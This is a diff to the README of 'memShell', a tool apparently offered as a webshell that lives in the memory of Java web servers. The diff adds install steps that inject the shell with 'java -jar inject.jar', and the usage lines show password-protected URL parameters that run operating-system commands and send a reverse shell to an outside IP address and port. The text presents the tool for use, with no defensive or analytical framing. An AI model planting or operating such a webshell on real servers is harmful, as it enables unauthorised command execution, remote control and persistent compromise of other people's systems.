@@ -1,7 +1,11 @@
 # memShell
 a webshell resides in the memory of java web server
 
-# Usage
+# install
+* unzip memShell.zip
+* cd memShell
+* java -jar inject.jar
+# usage
 * anyurl?pwd=pass //show this help page.  
 * anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.  
 * anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.  
